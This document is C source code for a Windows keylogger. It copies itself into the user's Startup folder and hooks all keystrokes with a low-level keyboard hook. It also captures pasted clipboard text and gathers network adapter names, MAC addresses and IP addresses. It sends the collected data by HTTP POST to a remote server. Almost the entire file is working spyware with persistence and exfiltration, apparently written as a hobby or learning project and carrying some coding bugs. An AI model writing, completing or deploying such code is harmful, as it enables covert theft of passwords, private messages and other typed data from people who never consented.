// Compile: clang Winapp.c -o static/win.exe -liphlpapi -lws2_32 -lgdi32
// -lUser32 -lwinhttp -lShell32 clang Winapp.c -o win.exe -liphlpapi -lws2_32
// -lgdi32 -lUser32 -lwinhttp -lShell32
#pragma warning(disable : 4996)

#include "Winapp.h"

#include <Windows.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>
#include <winuser.h>
#include <ws2tcpip.h>

int main() {
    CopyExecutableToStartup();

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    // Set up the keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // This code continuously retrieves and processes messages from the message
    // queue in a Windows GUI application... dont really understand how though
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Check if the keyboard hook setup is successful
    if (!keyboardHook) {
        printf("Failed to set up the keyboard hook.\n");
        return 1;
    }

    printf("Keylogger started. Press Ctrl+Q to exit...\n");
    // Unhook the keyboard hook
    UnhookWindowsHookEx(keyboardHook);
    printf("Exiting the program.\n");
    return 0;
}

int CopyExecutableToStartup() {
    char currentPath[MAX_PATH];
    char destinationPath[MAX_PATH];

    if (GetModuleFileName(NULL, currentPath, MAX_PATH) == 0) {
        printf("Failed to get the current executable path\n");
        return 1;
    }

    char userProfilePath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath))) {
        snprintf(destinationPath, MAX_PATH,
                 "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start "
                 "Menu\\Programs\\Startup\\win.exe",
                 userProfilePath);

        if (CopyFileA(currentPath, destinationPath, FALSE) == 0) {
            DWORD errorCode = GetLastError();
            LPVOID errorMessage;
            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL,
                          errorCode,
                          0, // Default language
                          (LPSTR)&errorMessage, 0, NULL);

            if (errorMessage != NULL) {
                printf("Failed to copy the executable to the Startup folder "
                       "(Error "
                       "Code: %lu)\n",
                       errorCode);
                LocalFree(errorMessage);
            } else {
                printf("Failed to copy the executable to the Startup folder "
                       "(Error "
                       "Code: %lu)\n",
                       errorCode);
            }
            return 1;
        } else {
            printf("Copy of the executable created in the Startup folder\n");
            return 0;
        }
    }
    return 1;
}

// Define a global KeyloggerData structure
void InitializeKeyloggerData(struct KeyloggerData *data) {
    data->exitRequested = false;
    data->clientSocket = INVALID_SOCKET;
    data->keylogBuffer[0] = '\0';
    data->adapterInfoBuffer[0] = '\0';
    data->clipboardBuffer[0] = '\0';
    data->combinedData[0] = '\0';
}

// Function to retrieve MAC addresses and IPs
char *GetMACAddressesAndIPs(struct KeyloggerData *data) {
    // Initialize variables for retrieving adapter addresses Might want to set
    // up a static amount so I am not dynamically allocating on the heap
    ULONG outBufLen = 0;
    DWORD result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &outBufLen);
    // printf("Result: %lu\n", result);
    //  Check if buffer overflow occurred
    if (result == ERROR_BUFFER_OVERFLOW) {
        // Allocate memory for adapter addresses
        IP_ADAPTER_ADDRESSES *pAdapterAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
        // dont think this is needed. and might be bad?
        memset(pAdapterAddresses, 0, outBufLen);
        if (pAdapterAddresses) {
            // Retrieve adapter addresses
            result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL,
                                          pAdapterAddresses, &outBufLen);
            if (result == NO_ERROR) {
                // Traverse through adapter addresses
                IP_ADAPTER_ADDRESSES *pAdapter = pAdapterAddresses;
                while (pAdapter) {
                    char adapterInfo[1028];
                    char ipAddress[16];

                    // Loop through unicast addresses to find IPv4 address
                    for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAdapter->FirstUnicastAddress;
                         pUnicast; pUnicast = pUnicast->Next) {
                        if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                            struct sockaddr_in *sockAddrIn =
                                (struct sockaddr_in *)pUnicast->Address.lpSockaddr;
                            inet_ntop(AF_INET, &(sockAddrIn->sin_addr), ipAddress,
                                      sizeof(ipAddress));

                            break; // Found IPv4 address, exit loop
                        }
                    }
                    // Format adapter info
                    snprintf(adapterInfo, sizeof(adapterInfo),
                             "Adapter Name: %s\n"
                             "MAC Address: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n"
                             "IP Address: %s\n\n",
                             pAdapter->AdapterName, pAdapter->PhysicalAddress[0],
                             pAdapter->PhysicalAddress[1], pAdapter->PhysicalAddress[2],
                             pAdapter->PhysicalAddress[3], pAdapter->PhysicalAddress[4],
                             pAdapter->PhysicalAddress[5], ipAddress);

                    // Append adapter info to the main buffer
                    strcat(data->adapterInfoBuffer, adapterInfo);
                    pAdapter = pAdapter->Next;
                }

                free(pAdapterAddresses); // Free memory allocated for
                                         // IP_ADAPTER_ADDRESSES

                return data->adapterInfoBuffer;
            } else {
                printf("GetAdaptersAddresses failed with error: %lu\n", result);
            }

            free(pAdapterAddresses);
        } else {
            printf("Failed to allocate memory for adapter addresses.\n");
        }
    } else {
        printf("GetAdaptersAddresses failed with error: %lu\n", result);
    }
    return NULL; // Return NULL in case of error
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static struct KeyloggerData data;
    static bool initialized = false;

    // sends the adapter info if first time connected
    if (!initialized) {
        InitializeKeyloggerData(&data);
        GetMACAddressesAndIPs(&data);
        snprintf(data.combinedData, sizeof(data.combinedData), "%s%s%s", data.adapterInfoBuffer,
                 data.keylogBuffer, data.clipboardBuffer);
        SendDataToServer(&data);
        initialized = true;
        memset(data.adapterInfoBuffer, 0, sizeof(data.adapterInfoBuffer));
    }

    // Check if a key is pressed
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

        // Check if Shift and Control keys are pressed
        bool shift = GetKeyState(VK_SHIFT) & 0x8000;
        bool ctrl = GetKeyState(VK_CONTROL) & 0x8000;
        HANDLE clipboardData = GetClipboardData(CF_TEXT);
        char *clipboardText = (char *)GlobalLock(clipboardData);

        // Get the corresponding character(s) based on the key press
        BYTE keyboardState[256] = {0};
        if (shift)
            keyboardState[VK_SHIFT] = 0x80;

        // LPWSTR LPbuffer = {0};
        char *buffer[255] = {0};
        int length = ToUnicode(p->vkCode, p->scanCode, keyboardState, buffer, 4, 0);

        // char buffer[255] = {0};

        // WideCharToMultiByte(CP_UTF8, 0, LPbuffer, -1, buffer, 255, NULL,
        // NULL);

        // Append the character(s) to the keylog buffer
        strncat(data.keylogBuffer, buffer, length);

        if (p->vkCode == VK_RETURN) {
            // Combine the data for printing
            snprintf(data.combinedData, sizeof(data.combinedData), "%s", data.keylogBuffer);

            // Send the data to the server only if it hasn't been sent before
            SendDataToServer(&data);

            // Clear the keylog buffer (set to 0)
            memset(data.keylogBuffer, 0, sizeof(data.keylogBuffer));
        }

        // handle copy-pasted text
        else if (p->vkCode == 'V' && GetAsyncKeyState(VK_CONTROL) < 0) {
            if (OpenClipboard(NULL)) {
                HANDLE clipboardData = GetClipboardData(CF_TEXT);
                if (clipboardData) {
                    char *clipboardText = (char *)GlobalLock(clipboardData);

                    // Append clipboard text to the clipboard buffer
                    strncat(data.clipboardBuffer, "{",
                            sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);
                    strncat(data.clipboardBuffer, clipboardText,
                            sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);
                    strncat(data.clipboardBuffer, "}",
                            sizeof(data.clipboardBuffer) - strlen(data.clipboardBuffer) - 1);

                    snprintf(data.combinedData, sizeof(data.combinedData), "%s",
                             data.clipboardBuffer);

                    GlobalUnlock(clipboardData);
                    CloseClipboard();

                    printf("\n\nclipboardBuffer: %s", data.clipboardBuffer);

                    // Send clipboard data to the server
                    SendDataToServer(&data);

                    // Clear the clipboard buffer (set it to 0)
                    memset(data.clipboardBuffer, 0, sizeof(data.clipboardBuffer));
                }
            }
        }
        // Check if Ctrl+Q is pressed to close program
        else if (p->vkCode == 'Q' && GetAsyncKeyState(VK_CONTROL) < 0) {
            printf("Ctrl-Q was pressed");
            data.exitRequested = true;

            memset(data.keylogBuffer, 0, sizeof(data.keylogBuffer));
            memset(data.clipboardBuffer, 0, sizeof(data.clipboardBuffer));

            PostQuitMessage(0);
        }
    }

    // Call the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SendDataToServer(struct KeyloggerData *data) {
    // Initialize Winsock
    printf("\nsocket status: %llu", data->clientSocket);
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return;
    }

    // Create a socket I suppose I could have used a default socket instead of
    // storing it in my struct
    data->clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (data->clientSocket == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return;
    }

    // Specify server address and port
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    //I might want to move this, dosnt seem neccicarry every time
    if (connect(data->clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        closesocket(data->clientSocket);
        WSACleanup();
        data->clientSocket = INVALID_SOCKET; // Update the socket status
        return;
    }

    int contentLength = strlen(data->combinedData);

    // Prepare the HTTP POST request
    char httpRequest[16384];
    sprintf(httpRequest,
            "POST /upload HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Length: %d\r\n"
            "Content-Type: text/plain\r\n\r\n",
            SERVER_IP, contentLength);

    printf("\nData Sent to Server ------->: %s", data->combinedData);

    // Send the HTTP POST request header
    int headerBytesSent = send(data->clientSocket, httpRequest, strlen(httpRequest), 0);
    if (headerBytesSent != strlen(httpRequest)) {
        printf("Failed to send HTTP header to server.\n");
        closesocket(data->clientSocket);
        WSACleanup();
        return;
    }

    // Send all data
    int dataBytesSent = send(data->clientSocket, data->combinedData, contentLength, 0);
    if (dataBytesSent != contentLength) {
        printf("Failed to send data to server.\n");
        closesocket(data->clientSocket);
        WSACleanup();
        return;
    }
}